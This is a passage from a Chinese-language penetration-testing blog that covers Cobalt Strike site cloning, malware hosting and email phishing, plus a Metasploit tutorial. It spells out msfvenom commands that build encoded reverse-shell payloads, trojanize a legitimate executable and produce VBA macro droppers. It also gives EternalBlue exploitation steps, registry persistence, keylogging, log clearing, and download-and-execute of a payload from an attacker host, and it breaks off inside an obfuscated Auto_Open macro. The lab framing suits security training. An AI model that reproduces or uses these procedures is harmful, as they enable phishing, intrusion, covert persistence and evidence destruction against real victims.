配置的参数是访问ip后面的参数</p><p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p><p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p><p>攻击地址 ： 默认不配置</p><p><img src="/img/e0505ef1c8f3440197d821b84db7499c.png" alt="image.png"></p><p>配置完成后靶机访问  本地host地址</p><h2 id="10-2-挂马"><a href="#10-2-挂马" class="headerlink" title="10.2 挂马"></a>10.2 挂马</h2><p><img src="/img/30c3466760b74a0ca5eea3d37a65af3b.png" alt="image.png"></p><p>克隆URL  输入http网站链接</p><p>本地URL    配置的参数是访问ip后面的参数</p><p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p><p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p><p>攻击地址 ： 选择一个已经配置好的后面下载链接</p><p>配置完成后访问 本地host地址+ 参数 mb</p><h1 id="11-Cobalt-Strik-邮件钓鱼"><a href="#11-Cobalt-Strik-邮件钓鱼" class="headerlink" title="11  Cobalt Strik 邮件钓鱼"></a>11  Cobalt Strik 邮件钓鱼</h1><p>1 准备一个邮箱用于发送邮件</p><p>这边拿QQ邮箱为例  点击设置然后点击 账户</p><p><img src="/img/9969011be032489c8be8b39aa5e21406.png" alt="image.png"></p><p>找到 IMAP&#x2F;SMTP服务 点击开启服务 获取 授权码  （获取后把这个授权码先记录下来）</p><p><img src="/img/5c6b9d0a35a6439ea049c401ad493319.png" alt="image.png"></p><p>然后回到CS中  进入邮件钓鱼</p><p><img src="/img/dd792386511c4f028d239aaeb1cf5060.png" alt="image.png"></p><p>邮件钓鱼配置参数如下</p><p>目标 ：这里指的是接收邮件的邮箱  可以是txt文件</p><p>模板：邮件的格式和内容（可通过邮箱导出为模板）</p><p>附件： 可以加入后门程序或其他 或者不加</p><p>嵌入URL : 可以选择配置好的网站放进去</p><p>邮件服务器：</p><img src="/img/image-20230929150104748.png" alt="image-20230929150104748" style="zoom:67%;" /><p>密码是授权码</p><p><img src="/img/242bc7796dc84d26a5013b558ce7b8c9.png" alt="image.png"></p><p>退信通知邮箱 可以填写任意可接受邮件的邮箱</p><p><img src="/img/66e35b4a9f0048aaa06d3d4dc712b206.png" alt="image.png"></p><p>所有参数配置完成后 点击 Send 发送邮件即可</p><h1 id="12-将MSF会话注入Cobalt-Strik监控"><a href="#12-将MSF会话注入Cobalt-Strik监控" class="headerlink" title="12 将MSF会话注入Cobalt Strik监控"></a>12 将MSF会话注入Cobalt Strik监控</h1><h2 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1 环境准备："></a>1 环境准备：</h2><p>1 kali操作系统</p><p>2 Cobalt Strik 服务端和客户端</p><p>3 一个在MSF下拿到权限的靶机</p><h2 id="2-配置MSF创建监听"><a href="#2-配置MSF创建监听" class="headerlink" title="2 配置MSF创建监听"></a>2 配置MSF创建监听</h2><p>2.1 使用msf创建后门</p><p>msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.150 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10  -f exe -o payload.exe</p><p>2.2  使用python创建一个web服务 然后使用靶机下载</p><p>python3 -m http.server 80</p><p>2.3 配置监控并获取meterpreter</p><p>启动msf</p><blockquote><p>msfconsole</p></blockquote><p>创建监控</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>加载payload</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>配置监控参数</p><p>show options</p><p>set lhost   监控IP</p><p>set lport   监控端口</p><p>run  执行</p><p>去靶机执行后门程序 等待返回 meterpreter</p><p>2.4 后台当前session</p><p>background</p><h2 id="3-使用CS进行监控"><a href="#3-使用CS进行监控" class="headerlink" title="3 使用CS进行监控"></a>3 使用CS进行监控</h2><p>1 加载MSF的payload 注入功能</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</p><p>2 设置payload</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p><p>3   查看配置参数</p><p>show options</p><p>set lhost 10.0.0.36</p><p>设置cs服务器地址</p><p>4 set lport 4567</p><p>设置cs监听端口</p><p>5 set session 1</p><p>设置监控会话</p><p>6 set disablepayloadhander true</p><p>设置当前msf不接受监听数据</p><p>7 run</p><p>执行设置</p><p>4 CS开始实战操作</p><h1 id="13-安装插件"><a href="#13-安装插件" class="headerlink" title="13 安装插件"></a>13 安装插件</h1><p>在cobolt strike–&gt;script中直接导入插件的cna文件即可</p><p>小tip，CS加载插件出现乱码解决办法：</p><p><a href="https://blog.csdn.net/weixin_44309905/article/details/122687310">https://blog.csdn.net/weixin_44309905/article/details/122687310</a></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>msf基础操作</title>
    <link href="/2023/10/27/msf%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/10/27/msf%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="MSF-学习"><a href="#MSF-学习" class="headerlink" title="MSF 学习"></a>MSF 学习</h1><p>官网：<a href="https://metasploit.com/">https://metasploit.com/</a></p><h2 id="Metaspolit体系框架"><a href="#Metaspolit体系框架" class="headerlink" title="Metaspolit体系框架"></a>Metaspolit体系框架</h2><img src="/img/image-20230831211104843.png" alt="image-20230831211104843" style="zoom:67%;" /><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块组织按照不同的用途分为7种类型的模块 （Modules）：</p><p>分为辅助模块（Aux)、渗透攻击模块 （Exploits)、后渗透攻击模块（Post)、攻击载荷模块 （payloads)、 编码器模块（Encoders)、空指令模块（Nops)、 免杀模块(Evasion)</p><p><strong>Exploits</strong>：渗透攻击模块，利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法。</p><p><strong>Aux</strong>：辅助模块，负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能。 </p><p><strong>Post</strong>：后渗透攻击模块，在取得目标系统远程控制权限后，进行一系列的后渗透攻击 动作，如获取敏感信息、跳板攻击等操作。 </p><p><strong>Payloads</strong>：攻击载荷模块，成功exploit之后，真正在目标系统执行的代码或指令。 </p><p><strong>Encodes</strong>：编码器模块，主要对payload进行加密，最终达到躲避AntiVirus检查的目的。 </p><p><strong>Nops</strong>：空指令模块，主要作用是提高payload稳定性及维持大小。 </p><p><strong>Evasion</strong>：免杀模块，可以用来创建木马文件</p><p><img src="/img/image-20230831212047593.png" alt="image-20230831212047593"></p><h2 id="Metasploitable2-Linux靶机"><a href="#Metasploitable2-Linux靶机" class="headerlink" title="Metasploitable2-Linux靶机"></a>Metasploitable2-Linux靶机</h2><p>​Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计目的是作为安全工具测试和演示常见漏洞攻击的环境。</p><p>其中最重要的是可以用来作为MSF攻击用的靶机 开放了很多的高危端口如21、23、445等，而且具有很多未打补丁的高危漏洞， 如Samba MS-RPC Shell命令注入漏洞等，而且对外开放了很 多服务，并且数据库允许外联等。系统中的用户口令均为弱口令。系统 搭载了DVWA、Mutillidae等Web漏洞演练平台</p><p><img src="/img/image-20230831213105366.png" alt="image-20230831213105366"></p><h2 id="MSF启动"><a href="#MSF启动" class="headerlink" title="MSF启动"></a>MSF启动</h2><p>Metasploit启动有三种方式 </p><p>1.先启动Postgresql数据库 </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service postgresql <span class="hljs-literal">start</span><br>msfconsole<br></code></pre></td></tr></table></figure><p>2.直接启动 </p><p>3.启动Postgresql的同时启动Metasploit</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msfdb <span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230901100203685.png" alt="image-20230901100203685" style="zoom: 80%;" /><img src="/img/image-20230901100235457.png" alt="image-20230901100235457" style="zoom:80%;" /><h2 id="MSF命令"><a href="#MSF命令" class="headerlink" title="MSF命令"></a>MSF命令</h2><p>rank等级</p><p><img src="/img/image-20230901110041194.png" alt="image-20230901110041194"></p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p>用于展示可用模块，有效参数是：all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info</p><p><img src="/img/image-20230901100855408.png" alt="image-20230901100855408"></p><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索 直接查找 search后直接跟要查找内容，查得很广泛 可以根据名字、路径、平台、类型、联合查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">直接搜索漏洞编号：<span class="hljs-keyword">search</span> ms08_067<br>根据名字：<span class="hljs-keyword">search</span> <span class="hljs-type">name</span>:mysql<br>根据路径：<span class="hljs-keyword">search</span> <span class="hljs-type">path</span>:mysql<br>根据模块：<span class="hljs-keyword">search</span> <span class="hljs-keyword">type</span>:exploit<br>根据平台：<span class="hljs-keyword">search</span> platform:windows<br>联合查询：<span class="hljs-keyword">search</span> <span class="hljs-type">name</span>:mysql <span class="hljs-keyword">type</span>:exploit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230901100924747.png" alt="image-20230901100924747"></p><p><img src="/img/image-20230901101029758.png" alt="image-20230901101029758"></p><p><img src="/img/image-20230901101234524.png" alt="image-20230901101234524"></p><h3 id="use"><a href="#use" class="headerlink" title="use"></a>use</h3><p>使用某一个具体的模块  以ms08_067为例 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.search ms08_067<br><span class="hljs-number">2</span>.use exploit<span class="hljs-regexp">/windows/</span>smb/ms08_067_netapi<br><span class="hljs-number">3</span>.info<span class="hljs-regexp">//</span>查看基本信息（适用的攻击目标）和需要设置哪些参数<br><span class="hljs-number">4</span>.show options   <span class="hljs-regexp">//</span>需要设置的参数<br><span class="hljs-number">5</span>.show missing   <span class="hljs-regexp">//</span>必须要设置的参数<br><span class="hljs-number">6</span>.show target    <span class="hljs-regexp">//</span>可以攻击的目标<br></code></pre></td></tr></table></figure><img src="/img/image-20230901102816207.png" alt="image-20230901102816207" style="zoom:80%;" /><img src="/img/image-20230901103045590.png" alt="image-20230901103045590" style="zoom:80%;" /><h3 id="back"><a href="#back" class="headerlink" title="back"></a>back</h3><p>退出当前调用的模块</p><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>用于设置选项中的参数  以ms08_067为例</p><p><img src="/img/image-20230901103950114.png" alt="image-20230901103950114"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">10.210.100.129</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230901104043227.png" alt="image-20230901104043227"></p><h3 id="exploit-run"><a href="#exploit-run" class="headerlink" title="exploit&#x2F;run"></a>exploit&#x2F;run</h3><p>配置好选项参数之后发起攻击</p><p><img src="/img/image-20230901104210805.png" alt="image-20230901104210805"></p><h2 id="MSF攻击流程"><a href="#MSF攻击流程" class="headerlink" title="MSF攻击流程"></a>MSF攻击流程</h2><p>已知漏洞-&gt;查找模块-&gt;配置程序-&gt;run&#x2F;exploit</p><p><img src="/img/image-20230901104652942.png" alt="image-20230901104652942"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">search</span> xxx<br>use xxx<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> payload xxx<br>run/exploit<br></code></pre></td></tr></table></figure><h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>靶机：10.210.100.131  防火墙关闭</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1.</span>搜索可利用的模块：search ms17_010<br><span class="hljs-number">2.</span>使用辅助模块检测目标是否存在漏洞:<br>use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">10.210.100.131</span><br>run<br>3.使用漏洞利用模块<br>use <span class="hljs-comment">exploit</span>/windows/<span class="hljs-comment">smb</span>/ms17_010_eternalblue<br>set RHOSTS <span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.131</span><br>run/<span class="hljs-comment">exploit</span><br>exploit <span class="hljs-comment">-j</span>   //挂在后台<br>sessions <span class="hljs-comment">-l</span>//查看后台<br>session <span class="hljs-comment">-i id</span>  //进入指定<span class="hljs-comment">id</span>的<span class="hljs-comment">meterpreter</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230901111810932.png" alt="image-20230901111810932"></p><h2 id="Metasploitable2-Linux靶机-渗透"><a href="#Metasploitable2-Linux靶机-渗透" class="headerlink" title="Metasploitable2-Linux靶机 渗透"></a>Metasploitable2-Linux靶机 渗透</h2><p>1.信息搜集</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">扫描网段：nmap -sP <span class="hljs-number">10.210.100.0</span>/<span class="hljs-number">24</span><br>扫描端口：nmap -sT <span class="hljs-number">10.210.100.129</span><br>扫描版本：nmap -sV -p <span class="hljs-number">1-65535 10</span>.<span class="hljs-number">210.100.129</span><br>扫描是否存在常见的漏洞：nmap --script=vuln <span class="hljs-number">10.210.100.129</span><br><br>msf中也可以使用nmap(前提：开启数据库)<br>命令:db_nmap -xxx<br></code></pre></td></tr></table></figure><img src="/img/image-20230901151930762.png" alt="image-20230901151930762" style="zoom:80%;" /><p>2.漏洞利用</p><p>cve官网：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">search</span> 漏洞编号/服务+版本等<br>eg:<span class="hljs-keyword">search</span> vsftpd<br><span class="hljs-keyword">search</span><br><br><span class="hljs-keyword">use</span> exploit/unix/ftp/vsftpd_234_backdoor<br><span class="hljs-keyword">set</span> RHOSTS 10.210.100.129<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230901152321393.png" alt="image-20230901152321393" style="zoom:67%;" /><img src="/img/image-20230901152610498.png" alt="image-20230901152610498" style="zoom:67%;" /><p>整体流程：</p><ul><li>根据服务和版本查询漏洞 如cve漏洞 <a href="https://cve.mitre.org/">https://cve.mitre.org/</a></li><li>查询对应的exploit模块</li><li>添加配置参数</li><li>添加payload（show payloads）</li><li>run &#x2F; exploit</li></ul><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>​Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成 功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们 返回一个控制通道。 </p><p>​使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户 密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、 得到远程控制权、捕捉按键信息、清楚应用程序、显示、远程主机的系统信息、显示远程机器的网络接口和IP地址等信息</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">background：返回，把meterpreter后台挂起sessions：查看当前建立的会话<br>ps：查看进程<br>getpid：查看当前进程号<br>sysinfo：查看系统信息<br>getsystem：自动提权<br>getuid：查看当前权限<br><span class="hljs-built_in">run</span> scraper ：获取目标主机的详细信息<br>访问文件系统：cd、cat、 rm、<span class="hljs-built_in">edit</span> <br><span class="hljs-built_in">run</span> post/windows/gather/enum_applications：先查看目标主机安装了哪些应用 <br>screenshot：屏幕截图 <br>键盘记录：keyscan_start、keyscan_dump、keyscan_stop <br><span class="hljs-built_in">run</span> vnc：屏幕监控<br>进程迁移：migrate pid（例如winlogon进程的pid，记事本的pid等）<br></code></pre></td></tr></table></figure><img src="/img/image-20230901201441615.png" alt="image-20230901201441615" style="zoom:67%;" /><img src="/img/image-20230901202344287.png" alt="image-20230901202344287" style="zoom:67%;" /><img src="/img/image-20230901203250976.png" alt="image-20230901203250976" style="zoom:67%;" /><h3 id="生成持续后门"><a href="#生成持续后门" class="headerlink" title="生成持续后门"></a>生成持续后门</h3><p>​因为meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每 次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得<strong>在目标主机系统内留下一个持续性的后门，</strong>只要目标主机开机了，我们就可以连接到该主机</p><h4 id="1-写入注册表"><a href="#1-写入注册表" class="headerlink" title="1.写入注册表"></a>1.写入注册表</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use exploit/windows/<span class="hljs-keyword">local</span>/persistence<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> STARTUP <span class="hljs-keyword">SYSTEM</span><br>run<br></code></pre></td></tr></table></figure><img src="/img/image-20230901203733969.png" alt="image-20230901203733969" style="zoom:67%;" /><p><img src="/img/image-20230901203906910.png" alt="image-20230901203906910"></p><h4 id="2-开启监听"><a href="#2-开启监听" class="headerlink" title="2.开启监听"></a>2.开启监听</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.210.100.131</span><br>run<br></code></pre></td></tr></table></figure><h4 id="3-清除日志"><a href="#3-清除日志" class="headerlink" title="3.清除日志"></a>3.清除日志</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">meterpreter中：clearev<br></code></pre></td></tr></table></figure><h2 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h2><p>msfvenom是msfpayload,msfencode的结合体，可利用 msfvenom生成木马程序,并在目标机上执行,在本地监听上线</p><h3 id="制作windows恶意程序"><a href="#制作windows恶意程序" class="headerlink" title="制作windows恶意程序"></a>制作windows恶意程序</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">60.128</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 10 -f exe -o /</span>var<span class="hljs-regexp">/www/</span>html/vip.exe<br>二次编码：<br>msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">60.128</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/</span>alpha_upper -i <span class="hljs-number">10</span> -f exe -o <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>vip1.exe<br><br>-a 操作系统架构 <span class="hljs-number">32</span>位x86 <span class="hljs-number">64</span>位x64<br>--platform 操作系统<br>-p payload<br>-b 去掉坏字符 \x代表<span class="hljs-number">16</span>进制 <span class="hljs-number">00</span> 代表空字符<br>-e 指定编码器<br>-i 编码次数<br>-f 指定文件类型<br>-o 指定文件输出位置<br></code></pre></td></tr></table></figure><img src="/img/image-20230904193901605.png" alt="image-20230904193901605" style="zoom:80%;" /><p>开启apache服务</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">service</span> apache2 start <br>service apache2 status<br>靶机访问<span class="hljs-number">10.210.100.128</span>/vip.exe下载即可<br></code></pre></td></tr></table></figure><img src="/img/image-20230904194003154.png" alt="image-20230904194003154" style="zoom:80%;" /><img src="/img/image-20230904194053092.png" alt="image-20230904194053092" style="zoom:80%;" /><p>攻击机开启监听：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.210.100.128</span><br>run<br></code></pre></td></tr></table></figure><img src="/img/image-20230904194207115.png" alt="image-20230904194207115" style="zoom:80%;" /><h3 id="给软件加上后门"><a href="#给软件加上后门" class="headerlink" title="给软件加上后门"></a>给软件加上后门</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-string">b&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /</span>var<span class="hljs-regexp">/www/</span>html/QvodTerminal.exe<br><br>-x 以某个程序为模板<br></code></pre></td></tr></table></figure><img src="/img/image-20230904200039369.png" alt="image-20230904200039369" style="zoom:67%;" /><p>主程序启动–&gt;子程序伴随启动–&gt;绑定子程序 QvodTerminal.exe</p><img src="/img/image-20230904200137580.png" alt="image-20230904200137580" style="zoom:67%;" /><p>开启监听然后 启动主程序即可</p><h3 id="制作linux恶意程序"><a href="#制作linux恶意程序" class="headerlink" title="制作linux恶意程序"></a>制作linux恶意程序</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x64 --platform linux -p linux<span class="hljs-regexp">/x64/m</span>eterpreter<span class="hljs-regexp">/reverse_tcp LHOST=10.210.100.128 LPORT=4444 -b &quot;\x00&quot; -i 10 -f elf -o /</span>var<span class="hljs-regexp">/www/</span>html/linux_test<br><br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set payload linux<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br>set LHOST <span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span><br><br>靶机下载：wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span>/linux_test<br>执行./linux_test<br></code></pre></td></tr></table></figure><img src="/img/image-20230904203151407.png" alt="image-20230904203151407" style="zoom:67%;" /><h3 id="利用宏感染word文档"><a href="#利用宏感染word文档" class="headerlink" title="利用宏感染word文档"></a>利用宏感染word文档</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe<br></code></pre></td></tr></table></figure><img src="/img/image-20230904203500417.png" alt="image-20230904203500417" style="zoom:67%;" /><img src="/img/image-20230904203520730.png" alt="image-20230904203520730" style="zoom:67%;" /><h4 id="1-复制宏代码"><a href="#1-复制宏代码" class="headerlink" title="1.复制宏代码"></a>1.复制宏代码</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">恶意代码：<br><br><span class="hljs-variable">Sub</span> <span class="hljs-type">Auto_Open</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Ictso12</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-variable">Ictso12</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso7</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso1</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso2</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso3</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso4</span> <span class="hljs-variable">As</span> <span class="hljs-variable">Paragraph</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso8</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso9</span> <span class="hljs-variable">As</span> <span class="hljs-variable">Boolean</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso5</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso11</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso6</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Byte</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ibhtnqbyoj</span> <span class="hljs-variable">as</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Ibhtnqbyoj</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Ibhtnqbyoj&quot;</span><br>        <span 